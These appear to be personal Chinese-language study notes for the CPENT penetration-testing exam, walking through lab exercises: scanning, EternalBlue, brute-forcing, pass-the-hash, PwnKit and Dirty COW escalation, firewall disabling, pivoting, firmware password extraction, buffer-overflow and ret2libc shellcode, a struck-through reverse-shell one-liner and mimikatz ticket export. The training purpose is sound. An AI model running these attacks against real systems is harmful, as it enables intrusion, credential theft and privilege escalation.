---
title: MY PENETRATION NOTE

---

# EC_Council Platform

* 請用電子教材(一年有效)
* iLab(半年份)
* Exam Dashboard開通後必須30天內完成考卷(否則得重新購買考試卷)

## Exam proccess

* 大神級平均應考時間8~10H
* 普通百姓平均應考時間12~16H
* 分1天24H 及 2天12H
    * 2天12H方案，兩天間距日數不限
* 考試結束後7天內要繳交滲透報告(簡單敘述即可不會過度刁難，該有的解題過程與截圖即可)
* 滿分2500(500*5)，LPT分數2250 up↑
* 可約考試時間平日中午1200~晚上2400
* 考試要準備護照(過期沒關係)
* 不能使用雙螢幕

## 會員保持

* ECE:120 credit/ 3 year
* 年費:250 us / year

## Exam outline

1.  AD
2.  BIN + IOT
3.  CTF
4.  OT
5.  Pivot & Double Pivot

    Host:20
    Subnet:10
    
* 透過openvpn 連入 Exam Range
* Launch Exam -- Exam start
* 共55題選擇題，每區大概8~12題
* Report重點在報告範本2.0_Comprehensive Techincal Report
* 難易度從簡單到較複雜
    1. OT
    2. BIN、IOT
    3. CTF
    4. AD、P&DP

## Course schedule
* Day1~2 : 
    * Scan
    * 爆破
    * 攻擊、提權
    * OT封包分析
* Day3 : 
    * P & DD
    * 韌體拆解
* Day4 : 
    * Bin
* Day5 : 
    * AD
    * Web
    * RCE

# Day 1
## LAB 6

### **Scan**

 - IP (arp, icmp, 25, 80, 445, 3389)
 - Port (rustcan)
 - Service

常用：對單一IP
```
nmap -T5 -Pn -A (IP)
```
常用：對網段
```
nmap -T5 -sn <IP/range>
```

#### **Host Discovery: IP (arp, icmp, 25, 80, 445, 3389)**


`sudo nmap –n –sn –PS22,80,445,3389 192.168.0.1-254 –oG ip_scan.txt`

Windows:139、445、3389
Linux:22、80

`grep Up ip_scan.txt | cut –d" " –f2`

`for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &); done`

`cat /proc/net/arp | grep -v 00:00:00:00:00:00 | grep eth0 | cut -d' ' -f1`

![image](images/rJWTAD686.png)

![image](images/HkOyk_aLT.png)

![image](images/H1DM1daIT.png)

![image](images/rJEEy_pUp.png)

![image](images/r1rw1daIp.png)

![image](images/HkGskOpLp.png)

#### **密技!!**
```
sudo arp-scan -l
```
![image](images/HJS3e56Lp.png)


### **Port**
```
nmap <ip> --top 1000
```
掃描前1000個常用port
![image](images/Sk9Nru68T.png)
*/usr/share/nmap/nmap-services 依nmap統計使用頻次排序*

```
nmap <ip> -p-
```
全端口掃描1~65535
![image](images/SkYDBO68p.png)

#### **UDP掃描**
```
nmap <ip> -sU
```
UDP --> 非連結導向
UDP 不適合掃描有防火牆環境，結果不準確
![image](images/r1kJK_p8p.png)
UDP常使用端口 : 
UDP SCAN 53, 69, 137-138, 161, 1900, 5353
**But 161 考試常用!!**

#### **應用層掃描**
```
nmap <ip> -sC
```
常搭配-sV使用
![image](images/HyMB8FaIp.png)

![image](images/B1bP8KpUa.png)
 
搭配script使用
腳本路徑 : /usr/share/nmap/scripts/

example : 
```
nmap - p 445 192.168.0.7 -sVC --script smb-protocols
```
![image](images/r1T4vt6Ia.png)


### **Bash**

```
bash -c 'echo > /dev/tcp/192.168.0.70/22 && ehco open'
```
socket : tcp/192.168.0.70/22
&& : and

![image](images/HyXfUuT8T.png)
掌握原則後就可以開始加工
example : 
```
bash -c 'for port in {1..100}; do (echo > /dev/tcp/192.168.0.70/$port && echo $port open &); done'
```
![image](images/HyDkuO6Up.png)
![image](images/rkLw5d68p.png)
再更近一步加工
```
bash -c 'for port in {1..100}; do (echo > /dev/tcp/192.168.0.70/$port && echo $port open &); done' 2> /dev/null
```
![image](images/HkR5cdTU6.png)

#### RustScan 
從1~63353高速掃描好工具
https://github.com/RustScan/RustScan
下載
```
wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
```
安裝
```
sudo dpkg -i rustscan_2.0.1_amd64.deb
```
執行
```
rustscan -u 5000 -t 7000 -a 192.168.0.7
```
![image](images/r1KIBK6UT.png)

![image](images/S1PKBKpI6.png)

![image](images/Hyo5HtaIa.png)

結合nmap運用
```
rustscan -u 5000 -t 7000 -a 192.168.0.7 -- -n -Pn -sVC -oG
```
![image](images/BJDTsKaLT.png)

### **開扁，運用永恆之藍漏洞**
* 運用nmap永恆之藍偵測腳本
```
nmap 192.168.0.7 -n -Pn -p 445 --script smb-vuln-ms17-010.nse
```
![image](images/ryNnhFTUp.png)

* CPENT沒有限制使用工具，Metaspoit給他用下去
    * search ms17_010
![image](images/BJ95pY6U6.png)

    * use exploit/windows/smb/ms17_010_eternalblue
![image](images/SJg0TK6Lp.png)

    * show options
![image](images/SkRVCFpUa.png)

    * set rhosts 192.168.0.7
    * check
![image](images/H17h0F6IT.png)

    * exploit
![image](images/SJaJy5TIp.png)
.
.
.
![image](images/SJwI19a8a.png)

### **Homework**
Enumerate
1. Computer Name
2. OS / Server Version
3. SSH Key

# Day 2
## LAB 6

### SNMP - UDP 161
```
sudo nmap -n -p161 -sU --open -oG snmp_list.txt 192.168.0.*
```
```
cat snmp_list.txt | grep Up | cut -d' ' -f2 > snmp_ip.txt
```
![image](images/H1t4xdCUp.png)

#### 快速的UDP掃描器--Onesixtyone
```
onesixtyone -i snmp_ips.txt public
```
![image](images/rJqxW_0LT.png)

#### 列舉snmp詳細資訊
```
snmp-check <IP>
```
![image](images/Bkw-7O0U6.png)


#### nmap列舉user腳本 snmp-win32-users
```
sudo nmap -n -p161 -sU --script snmp-win32-users 192.168.0.20,22
```
![image](images/H11hbORLT.png)
![image](images/HkqT-uAUT.png)

### NetBIOS(Windows的網路芳鄰) over TCP/IP (NetBT)

#### Protocol : UDP 137,138

#### 列舉NetBT(NetBIOS over TCP/IP)
```
nbtscan <IP range>
```
![image](images/rygBtu08a.png)

NetBIOS詳細資訊
```
nbtscan -v <IP> 
```
![image](images/rkzq_tCLp.png)

```
nmblookup <NetBIOS Name>
```
```
nmblookup -A <IP>
```
![image](images/r1hTdtRL6.png)

SMB遠端連線
```
smbclient -U '<user>&<password>' //<ip>/c$
```
![image](images/B1xYFFCUp.png)


### 爆破Windows最好的工具 : crackmapexec(使用impacket模板)
#### 更新impacket模組
```
python3 -m pip install --upgrade impacket
```
![image](images/ByHDvK086.png)

確認更新後版本
```
python3 -m pip install | grep impacket
```
![image](images/HyvtvYALa.png)

#### crackmapexec運用
```
crackmapexec smb <smb_IP> -u <users.txt> -p <password.txt>
```
可搭配--continue-on-success
![image](images/HyAbOK0LT.png)

取得帳號密碼即可遠端登入
```
psexec.py '<user>:<passowrd>'@<ip>
```
![image](images/B1DFkqALa.png)

#### 以取得hash方式取代password
取得雜湊值腳本
```
impacket-secretsdump 
'administrator:Pa$$w0rd'@192.168.0.22
```
![image](images/Skw1ycCLa.png)

以hash方式遠端登入
```
psexec.py 'administrator'@192.168.0.22 -hashes:<hash>
```
![image](images/r1l6Z9A8a.png)

pth-winexe 遠端方式
```
pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
``` 
![image](images/ByB8G9AUa.png)


### RDP(遠桌) -TCP 3389

#### remmina
```
remmina -c rdp://(user)@(IP)
```

#### xfreerdp

不同的linux環境使用xfreerdp可能會遇到問題，檢查版本
```
sudo dpkg –l | grep freerdp
```
![image](images/HJnmAc0IT.png)

版本需求
> Version > 2.3
必要3個套件
1. freerdp2-x11
2. libfreerdp2-2
3. libfreerdp-client2-2

```
xfreerdp /v:<IP> /u:<user> /p:'<password>' /size:90% /cert-ignore -tls-seclevel:0
```
![image](images/rk4u69AUT.png)

#### 如果3389端口未開，可以藉由登入檔修改突破

reg add rdp
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### 強大的密碼爆破工具--hydra

```
hydra rdp://<ip> -l <user> -p '<password>'
```
使用帳號字典檔
```
hydra rdp://<ip> -L <帳號字典檔> -p '<password>'
```
使用密碼字典檔
```
hydra rdp://<ip> -l <user> -P <密碼字典檔>
```
![image](images/By9V-iRU6.png)

### SSH
#### Protocol : TCP 22

運用nmap協助分析
```
nmap -iL <ip list> -p22 -n -Pn -sVC
```
![image](images/rks8OsAU6.png)
![image](images/B1HOuj0La.png)
![image](images/Hkx2djRLT.png)

ll /usr/share/nmap/script/*ssh*

#### 利用metaspoit的user列舉模組
* msfconsole -q
* search ssh_enumusers
* use <auxiliary...模組路徑>
![image](images/rJ98is0Lp.png)

* info
![image](images/Hk15isCIp.png)
![image](images/H1AsojC86.png)

* set rhosts <target_IP>
* set user_file <username字典檔>
* set check_false true
![image](images/H18x2s0Ua.png)

* exploit
* ![image](images/Sk3MniCU6.png)

取得username之後，使用hydra來實施爆破
```
hydra ssh://<IP> -l <username> -P <Password 字典檔>
```
![image](images/By_ly20Up.png)

遠端登入
```
ssh <username>@<IP>
```
登入成功
![image](images/SyumynRIa.png)

*補充
hydra -L 字典黨 -P 字典黨 127.0.0.1 -s 8888 -t 4 ssh

### owaspbwa
https://code.google.com/archive/p/owaspbwa/
https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki

**小密技，遇到這種靶機，Pa$$w0rd123，這個密碼直接試試看**

### Privilege Escalation
* Linux https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* Windows
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

#### su 與 sudo 的差異
* su:
切換至目標帳號/需要目標帳號密碼
* sudo:
    預授權
    1. 是否驗證(自己的密碼)
    2. 路徑、檔名、參數

#### PwnKit
Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation

使用腳本
https://github.com/ly4k/PwnKit
下載路徑
```
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
```
將payload放進目標機後
給予payload執行權限
```
chmod +x PwnKit
```
執行
```
./PwnKit
```
成功提權
![image](images/BJe3930L6.png)

#### Dirty COW
Linux 2.8版本以下就能嘗試

```
searchspoit -m 40847
```
![image]ttps://hackmd.io/_uloads/SkEr46RI6.png)

傳送檔案的其中一種方法
```
scp 4847.cpp aleklander@192.168.0.70:/路徑/
```

將payload放進目標機後
```
head 40847.cpp
```
![image](images/SyZ34TAI6.png)

執行腳本
```
g++ -Wall -pedantic -02 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```
```
./dcow -s
```
成功
![image](images/ryNmraRUp.png)


### Egress Busting

~~在靶機端有植入reverse shell的狀況下~~

~~curl "192.168.0.24/shell.php?cmd=id"~~
~~調整~~
~~curl -G 192.168.0.24/shell.php --data-urlencode "cmd=id"~~

~~new console:
nc -nvlp8888~~

~~回parrot
curl -G 192.168.0.24/shell.php --data-urlencode "cmd=bash -c 'bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1'"~~

exploit後如果發現shell沒有彈回來，檢測防火牆是否存在
```
sudo tcpdump -ni eht0 tcp[13]==2
```
* tcp[13]==2 看的是SYN封包

靶機傳輸tcp封包
```
for port in {200..210};do(echo > /dev/tcp/192.168.0.18/$port); done
```
![image](images/B1NI_CCU6.png)

parrot端所見封包
![image](images/rJ2pORC86.png)


### **Persistent**
#### **Windows**
psexec.py 'administrator:Pa$$w0rd'@192.168.0.7
netsh advf
![image](images/HJDoqARUa.png)

顯示狀態
netsh advf show allprofiles
![image](images/B1qT9C0UT.png)

關掉防火牆
netsh advf set allprofiles state off
![image](images/Bys05RCL6.png)

#### **Linux**
sudo iptables –P INPUT ACCEPT
sudo iptables –P OUTPUT ACCEPT
sudo iptables -F (-F回到預設值)

### POST_找檔案
#### Windows 
`dir *secret* /s 2> nul`
dir /s secret.txt 2> nul
`search -f -*flag*`
findstr /n /i /s secret <特定folder/*>
findstr /n /i /s key <特定folder/*>

#### Linux
find . -iname ssh* 2> /dev/null

find / -name (file_name)

grep -nir aeskey *
![image](images/SkIOHJyva.png)

grep -nir aeskey * 2>/dev/null
![image](images/r1dkIkJD6.png)

# Day 3
## OT

wireshark
小技巧:於傳輸層把TCP封包編號關掉

Statistics:Endpoints
Statistics:Conversations
Statistics:Protocol Hierarchy Statistics

MAC解析
View - Name Resolution - resolve physical address

transaction identifier:(port)
想查詢(port)，右鍵
prepare as fliter - mbtcp.trans_id==(port)


## Pivoting & Double Pivoting

### SSH Local Port Forwarding
ssh administrator@192.168.0.70 -L *:80:192.168.0.24:80

檢查本地
sudo netstat -antp | grep :80 

Watch指令
https://caloskao.org/linux-watch-use-watch-to-execute-a-command-periodically/
可以建立即時性netstat監控視窗

### SSH Remote Port Forwarding
sudo netstat -ntp
設定擋修改
* server端
sudo nano /etc/ssh/sshd_config
加入GatewayPorts yes
sudo service ssh restart

ssh administrator@192.168.0.70 -R *:8008:192.168.0.24:80
sudo netstat -antp | grep :80

### SSH dynamic port forwarding

```
ssh administrator@192.168.0.70 -D 9050
```

* client端檢查
    `sudo netstat -antp | grep :9050`
    ![image](images/BygCY0kv6.png)

    cat /etc/proxychains.conf
    內建已有socks4，也可以改用socks5
    ![image](images/Byu3FAyPT.png)

利用smbclient遠端連線
```
proxychains smbclient -U 'administrator%Pa$$w0rd' //192.168.0.7/c$
```
![image](images/H1iUj0yv6.png)

server端檢查
sudo netstat -antp

也能使用
proxychains winexec -U 'administrator%Pa$$w0rd' //192.168.0.7 cmd.exe

*探討
whereis proxychains
ls /usr/bin/proxychains
ll /usr/bin/proxychains
ll /etc/alternatives/proxychains
ll /usr/bin/proxychains3
file /usr/bin/proxychains3
cat /usr/bin/proxychains3
so.3 *

### SSH Local Port Forwarding /w Jump Host 超好用

```
ssh -J administrator@192.168.0.70 administrator@192.168.0.10 -L *:8888:192.168.0.24:80
```
```
ssh (username)@(middle_IP) -L 127.0.0.1:8888:(target_IP):22
```
```
ssh (username)@(middle_IP) -L 445:(target_IP):445
```

藉由第一臺登到第二臺

* client check
    sudo netstat -antp | grep :8888
    
* hop check
    sudo netstat -antp
    
nc 127.0.0.1 8888
會直接連線到target，中間hop不會有紀錄
或
`ssh -p 8888 (username)@127.0.0.1`

* target check
    sudo netstat -antp
    
* find /etc/ssh
* netstat -antp

### Meterpreter **Session Routing**
利用SSH種後門(reverse shell)
再利用meterpreter 用永恆之藍exploit
(缺點無腦，綁定meterpreter)

選database server 當 target
//把該target 172_subnet 網卡關掉
//把該parrot 192_subnet 網卡關掉
啟動網卡
ifconfig eth* up
關閉網卡
ifconfig eth* down

msfconsole -q
search sshexec
set rhosts 172.19.19.70
set username administrator
set password Infinit3
set lhost 172.19.19.18
exploit

* Meterpreter
run post/multi/manage/autoroute OPTION=s
run autoroute -p
background

search 17_010
use 2(檢查下路徑編號對不對)
set rhost 192.168.0.7
exploit
(成功率不高，平均20次中一次)

### Datapipe

https://github.com/bovine/datapipe

把datapipe.c丟到target
```
scp datapipe.c administrator@172.19.19.70:~/.
```

* target
```
gcc /home/administrator/datapipe.c -o datapipe
```
```
./datapipe
```
```
./datapipe 0.0.0.0 135 192.168.0.7 135
```
```
./datapipe 0.0.0.0 445 192.168.0.7 445
```
```
./datapipe 0.0.0.0 4444 192.168.0.7 4444
```
![image](images/Hye_dZgwa.png)

* ok, use metaploit ms17_010
```
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 172.19.19.70
set lhost 192.168.0.70
check
exploit
```
成功
![image](images/Hyl_gtWgPT.png)

![image](images/HkxfFbevT.png)


#### **Socat**

本地DNS解析
```
host goo.gle 127.0.0.1
```
使用Socat前
![image](images/HyRLAbgPp.png)


```
socat udp-recvfrom:53,fork udp-sendto:8.8.8.8:53
```
![image](images/B1YXnWewp.png)

使用Socat後
![image](images/B1xexzgwa.png)





#### Windows
(需要權限)
netsh int port add v4tov4 8888 192.168.0.24 80
netsh int port show v4tov4
netsh int port delete v4tov4 8888 192.168.0.24 80

### Chisel(補充)
**沒聽懂，再研究**
linux 1.9.1 adm64
windows 1.9.1 adm64

chisel server –p 443

chisel client <chisel_server>:443 <remote_addr>:445
* reverse
chisel server –p 443 --reverse 
chisel client <chisel_server>:443 R:<remote_addr>:445

* Window

檢查
netstat -an | findstr :8888

* linux
./chisel client 10.0.1.5:8080 R:8888:127.0.0.1:8888

SSH over WSS over HTTP

## IOT

### !!!! Kali環境binwalk有問題，要切換其他linux(如Parro) !!!

先安裝好韌體檔壓縮工具--sasquatch.git
```
git clone https://github.com/useidel/sasquatch.git

```
```
./build.sh

```

### Practice
---
#### DVRF_v03.bin
binwalk -t -e DVRF_v03.bin
cd _DVRF_v03.bin.extracted/
ll
cd squashfs-root/
ll

---

#### Dlink_firmware 藏有telnet密碼，找到他
```
binwalk -t -e _Dlink_firmware.bin
cd squashfs-root
ll
```
![image](images/rkQ7EUxvT.png)

```
grep -nir telnet

```
![image](images/B1KSN8gv6.png)
發現可疑的路徑及shell script
/etc/scripts/misc/telnetd.sh
Let's check out
```
cat etc/scripts/misc/telnetd.sh

```
![image](images/S1fMSUxD6.png)

可以看到telnetd -l "/usr/sbin/login" -u Alphanetworks:$image_sign
密碼就是這個$image_sign變數
而先前已宣告這個變數
image_sign=`cat /etc/config/image_sign`

```
cat etc/config/image_sign

```
![image](images/HkiBLUeP6.png)
得到telnet password!!

---
#### D6000 藏有6密碼，5明文和1密文，找到他

grep -nir password
userfs/r.. 203

grep -nir password userfs/romfile.cfg
看203、206
發現喜歡用passwd

grep -nir passwd userfs/romfile.cfg
可以找到好幾組密碼
![image](images/SJyq7wxDa.png)
* Password(明) 
    1. password
    2. 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678
    3. anon@localhost
    4. 1234
    5. chillispot

另一種方法(**還要研究**)
```
find . -iname password -ls
find . -iname passwd -ls
```
![image](images/SJ1YwwevT.png)


觀察到
cat usr/etc/passwd
![image](images/SkPt0Ilwp.png)
得到密文

john usr/etc/passwd
![image](images/S15o0UewT.png)
解明文得：1234

* 補：登陸資訊userfs/romfile.cfg

---
#### encrypted
binwalk -E 檔案

Entropy 殤值
值越高檔案構成越亂


hexdump -v -C encrypted.bin | cut -d" " -f3-20 | sort | uniq -c | sort -nr | head -n 20

---
binwalk –t encrypted.bin 

```
hexdump -v -C encrypted.bin 
```
![image](images/rJgVnwMWwp.png)


Entropy 商值
值越高檔案構成越亂
```
binwalk -E encrypted.bin 
```
![image](images/H17HBz-PT.png)

hexdump -v -C encrypted.bin | cut -d" " -f3-20 | sort | uniq -c | sort -nr | head -n 20
![image](images/SJmU4f-v6.png)


XOR工具
https://github.com/mstrand/xcat

python3 Downloads/xcat.py -x 8844a2d168b45a2d encrypted.bin > decrypted.bin

binwalk -t -e decrypted.bin

---
**CTF xortool工具**
python3 -m pip install xortool
xortool encrypted.bin

xortool encrypted.bin -l 8 -c 00

ll

ll xortool_out/

binwalk -t -e xortool_out/0.out

cat xortool_out/filename-key.csv

python3 -c "print(b'\x88D\xa2\xd1h\xb4Z-'.hex())"

---

# Day 4

## Binary

Msvcrt.dll 
1. Microsofe
2. Visual C++
3. Runtime

Msvcrt.dll error
下載windows C++ 可轉發套件

rabin2 -z 檔案
可以把data section段的資料strings出來

工具 PEDA

### plactice
調查檔案
![image](images/B1u5Nmbvp.png)
發現是猜密碼的小程式

```
strings crackme0x00a
```
![image](images/r1a0ImZw6.png)
![image](images/rJT-PQbw6.png)
這邊其實可以從Eneter password這邊猜到密碼是
"g00dJ0B!"
![image](images/rJnDDXbvp.png)

* grep GLIBC 可以迅速找到C runtime程式
```
strings crackme0x00a | grep GLIBC
```
![image](images/SJMRwXZwT.png)

* rabin2 可以把data section段的資料strings出來
```
rabin2 -z crackme0x00a
```
![image](images/SJI7O7ZP6.png)

#### 利用強大的Debugger工具 -- gdb

##### **靜態分析**
```
gdb -q ./crackme0x00a

```
* gdb-peda
    * checksec
    * disassemble main

![image](images/SyrP0M-wT.png)

* ※TIPS:
    * 程式一開始的進入點 0x08048e4 <+0>
    * 逆向程式邏輯，先看call(呼叫函式)
* 從call 0x080483d0 <printf@plt> 
    往前看，eax被塞進[esp]固定儲存區
* 查看eax記憶體位置
    ```
    x/s 0x8048640
    ```
    ![image](images/SJjGombwp.png)
* 再看call 0x80483c0 <strcmp@plt>，引用了C的比較函數，高機率就是密碼
    ```
    x/s 0x804a024
    ```
    ![image](images/ryF0j7-vT.png)
    正解

---

##### 動態分析

```
b* main +70
run
```
![image](images/HJR53mbPa.png)
在stack看到答案

---

步驟34(重要)
gdb -q /bin/bash
break main
run
![image](images/HyNah4-v6.png)

info registers
* eax
* esp
* edp
* eip
* eflags
![image](images/Bkn93E-wT.png)

---

知道就好
64位元

b main
info register
* rax
* rbx
* rcx
* rdx
* r8
* r9
* r10
* r11
* r12
* r13
* r14
* r15

---
練習3、4 考試不重要 看看就好

---

練習5(重要)

sysctl -a --pattern randomize

關掉
sudo sysctl -w kernel.randomize_va_space=0
![image](images/rkzLaE-wp.png)


研究shellcode

cd ~/eamples/samplecode
cat shellcode
![image](images/B1H5a4bwp.png)


這段
((void(*)()buf))();
會把data儲存區資料轉換成函數執行
此攻擊手法叫NX/DEP

先關掉
gcc -z execstack -o shellcode shellcode.c
![image](images/SkdkxLbwa.png)


ll shellcode
./shellcode
echo $0
![image](images/H1eVx8WwT.png)
ll/bin/sh
發現是個 symbolic  link 到 /bin/sh dash*

sudo chmod 4755 shellcode
./shellcode
id

---
sudo cp /bin/bash .
sudo chmod 4755 bash
ll bash
./bash
id
![image](images/BkYieUbva.png)


./bash -p

為何呢
Linux本身的保護機制
BASH、DASH
when ruid ≠ euid → drop
所以在+參數 -p 解除保護機制
![image](images/rksalU-Da.png)


---
https://shell-storm.org/shellcode/files/shellcode-251.html
將shellcode uid gid 改為0
加入
```
  "\x6a\x17"			// push	$0x17
  "\x58"		    	// pop 	%eax
  "\x31\xdb"			// xor	%ebx, %ebx
  "\xcd\x80"			// int	$0x80

  "\x6a\x2e"			// push	$0x2e	
  "\x58"			    // pop	%eax
  "\x53"		    	// push %ebx
  "\xcd\x80"			// int	$0x80
```
![image](images/r1aHfI-Dp.png)


※TIPS: \x80 = call

---
##### stack.c

先觀察
![image](images/ryUHiUbwa.png)
發現執行錯誤
![image](images/rkx2Ls8Zv6.png)
使用gdb觀察
![image](images/HJahiUbw6.png)
![image](images/BJf128-wa.png)

run
![image](images/B1CgnUZwp.png)

記得原則，先看call，通常檔案出錯問題出在open、read，看到+55的open@plt

設定breakpoint
b *main +55
run
![image](images/HJ0in8ZvT.png)
找到是badfile問題，但發現目錄裡沒有這個檔案

※解決方向，那就自己創一個badfile
一樣先關掉execstack
gcc stack.c -z execstack -fno-stack-protector -o stack
touch badfile
./stack
![image](images/HyioTU-wT.png)

![image](images/HJapTIWvT.png)

成功執行

---

##### 緩衝區溢位

python -c 'print "A"*100' > badfile
![image](images/S1gnnCIWw6.png)

![image](images/Hyxykv-v6.png)
可以看到記憶體全被AAA灌滿

※**緩衝區溢位攻擊，關鍵在於緩衝區大小是否吻合**

* peda
pattern create 100 badfile
run
![image](images/BJz2ywZDa.png)

![image](images/HyD01w-v6.png)

pattern search
![image](images/ryUZlDZPa.png)

與EIP的距離 42byte

python -c 'print "A"*42 + "BBBB" + "C"*64' > badfile
![image](images/SkH9eDbvp.png)

* peda run
![image](images/BJL4ZD-DT.png)

"BBBB" 落在Return address ，EIP已被BBB填滿

接下來要把sellcode寫入
cat shellcode.c | grep '"'
cat shellcode.c | grep '"' | cut -d'"' -f2,4
cat shellcode.c | grep '"' | cut -d'"' -f2,4 | tr -d '\n'
cat shellcode.c | grep '"' | cut -d'"' -f2,4 | tr -d '"' | tr -d '\n'
![image](images/ByFX4wZw6.png)

以上複製下來
badfile改成:
python -c 'print "A"*42 + "BBBB" + "(shellcode"' > badfile
![image](images/rk2EEwZDT.png)

xxd badfile
![image](images/H1qrEwbwp.png)

run
![image](images/Bk937wZvT.png)

記憶體組合語言 從右邊往左看

---
兩種方式
將return address後ESP會彈回原本shellcode位置，寫入ESP位置
在return address直接寫死 JMP ESP 

jmpcall
jmpcall jmpesp
但沒找到
![image](images/HJy0dPbwa.png)
vmmap
![image](images/H14eKD-va.png)

有libc

jmpcall jmpesp /lib/i386-linux-gnu/libc-2.23.so
![image](images/SyLNYv-Pa.png)
找到jmp esp指令: b7e08aa9

置換原本的BBBB
※記得是由右到左
"\xa9\x8a\xe0\xb7" + "\x90"*8
這個"\x90"*8是確保NOP Sleed



ll stack
sudo chown root:root stack
sudo chmod 4755 stack
./stack
uid=0(root) (sambashare)

---
###### 練習6 Libc Exploit to Bypass No Execute Stack

cd ~/Download/libc
檔案 retlib.c
sizeof 改 140
![image](images/BJfInwbvp.png)


gcc retlib.c -o retlib -fno-stack-protector

sudo chown root:root retlib
sudo chmod 4755 retlib
ll retlib

new table~~
echo > badfile
./retlib

到gdb
gdb -q ./retlib
disassemble main
![image](images/Hy1eCPZDp.png)

disassemble bof
![image](images/BJReAD-wp.png)


pattern create 300 badfile
run
![image](images/SJkEAvbP6.png)

pattern search
![image](images/SyfjbubPa.png)
與EIP距離 24

python -c 'print "A"*24 + "BBBB" + "C"*128' > badfile
cat badfile
![image](images/ry1-Md-Da.png)

gdb~~run
![image](images/rklmGuWD6.png)
stack只到112，代表shellcode(payload)不能超過112byte

* 問題點來了
checksec
NX狀態是 ENABLED
system("/bin/sh") 即是 libc
![image](images/SJBvLd-Dp.png)

vmmap
找到/lib/i386-linux-gnu/libc-2.23.so
![image](images/Sk-vMd-vT.png)

※TIPS:找函數用p 找字串用find
p system   //p:print
p exit
find  /bin/sh
![image](images/BJBYvubv6.png)

整理下指令
system = 0xb7dfcda0
exit = 0xb7df09d0
/bin/sh = 0xb7f1da0b

修一下payload
python -c 'print "A"*24 + "\xa0\x9d\xd7\xb7" + "\xd0\xd9\xd6\xb7" + "\x0b\xaa\xe9\xb7"' > badfile
    
xxd badfile
./retlib
ll retlib

p setuid 
p setgid
p setgid-setuid(算出兩個指令的偏移值)
![image](images/ByHC__bDT.png)

peda ropgadget
找 popret
![image](images/rytkKOWvp.png)
popret = 08048345

setuid = b7eab2e0
setgid = b7eab360
system = b7e34da0
exit = b7e289d0
/bin/sh = b7f55a0b
"\xe0\xb2\xea\xb7" +   //setuid
"\x45\x83\x04\x08" + //ret
"\x00\x00\x00\x00" + // "0" 
"\x60\xb3\xea\xb7\" + //setgid
"\x45\x83\x04\x08" + // ret
"\x00\x00\x00\x00" +// "0"
"\xa0\x4d\xe3\xb7" +
"\xd0\x89\xe2\xb7" +
"\x0b\x5a\xf5\xb7"

---
##### 老師加碼練習

1. bin1 緩衝區溢位
challenge-one
sudo chown root:root challenge-one 
sudo chmod 4755 challenge-one
ll challenge-one
file chaalenge-one
![image](images/Hy1jl67D6.png)
這次程式是靜態連結 statically linked

* "補充"，自己的Linux環境如果發現沒有gdb可以使用
git clone https://github.com/longld/peda/git ~/peda
安裝詳看github

gdb -q ./challenge-one
checksec
![image](images/BJP4ZaXvT.png)
NX 是打開的
不是標準的標準的緩衝區溢位情境，所以不能直接注入shellcode，要使用"ROP"技巧
* NX 若關閉，則可寫入 shellcode
* NX 若開啟，則可透過 ROP chain 技巧執行 shell

disaassemble main
一樣看call
run
![image](images/ByICfTQvp.png)
觀察

pattern create 300
run
![image](images/r1wOQpXDp.png)
貼上剛的pattern
程式crash

pattern search
![image](images/S1_9X6XvT.png)

EIP距離44

pattern create 44
run
這邊在字串後面加入BBBB方便識別
![image](images/BJF8Ep7w6.png)
可以看到EIP已經被BBBB填註

vmmap 查看當前程式調用狀況
![image](images/rk3NAeND6.png)

利用老師提供的payload來戳程式
![image](images/BkL91b4DT.png)
特別注意到在void addr和ret addr的時候，記憶體位置就是剛剛vmmap的stack初始位置0xff93b00(這是會變動的，不要照抄)
payload調整後如下
![image](images/S1tzgWEvp.png)

執行payload
```
# while true; do (python exp_challenge-one.py; python -c 'import sys;sys.stdout.write("\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")';cat) | ./challenge-one; done
```
壓住enter不放讓他重複執行直到buffer overflow，開始輸出空白表示成功，輸入ID查看
![image](images/S1UpxW4w6.png)
成功

* 練習遇到的問題，這個payload使用的是python2語法，如果使用的linux環境如果沒有python2，payload會報錯無法執行，要先解決環境問題
* https://blog.xpnsec.com/rop-primer-level-0/
這是這題出題的參考來源，有原始payload的撰寫邏輯

---
###### bin2

sudo chown root:root: level-two
sudo chmod 4755 level-two
ll
![image](images/ryw4tZEDp.png)
不管輸入什麼都會輸出hello world的程式

disassemble main
一樣先看call程序
![image](images/SJ4RYWEv6.png)

disassemble vuln_function
![image](images/HJ2y5-VPT.png)
看到read@plt

pattern create 300
run
pattern search
![image](images/B1Nr5bEDa.png)
EIP距離140

pattern create 140
run
![image](images/H1oHjWEva.png)
確定EIP填充

該題payload
![image](images/r1Yw6ZNvT.png)

會調用到以下程序記憶體位置，依序去查找
p setuid
p setgid
p system
p exit
find /bin/sh
![image](images/ByiI0b4DT.png)

照查到位置去改py檔
![image](images/B1n0yGNDa.png)

執行payload，接下來enter壓住直到錯誤訊息消失(約跑128次)
```
while true; do (python2 ./exp_leveltwo.py; cat) | ./level-two; done
```
![image](images/H1qmlMVD6.png)
![image](images/HkABeMNDT.png)
成功！

* 為什麼popret不用特別去找和修改呢，你會發現拉出來的popret記憶位置與原本payload是相同的!Why?因為popret是從程式碼記憶體位置拉出來

# Day 5 
## ADPT

ndts.dit 是domain的資料庫

### ADRecon
找ADSI
看Schema

---
powershell -ep byapss
cd .\Download\

---

### Export Kerberos Tickets

2019DC

downloads--kerberows

miki...
抓x64

mimikatz

privilege::dubug
sekurlsa::tickets /export
![image](images/r1swlYzDp.png)
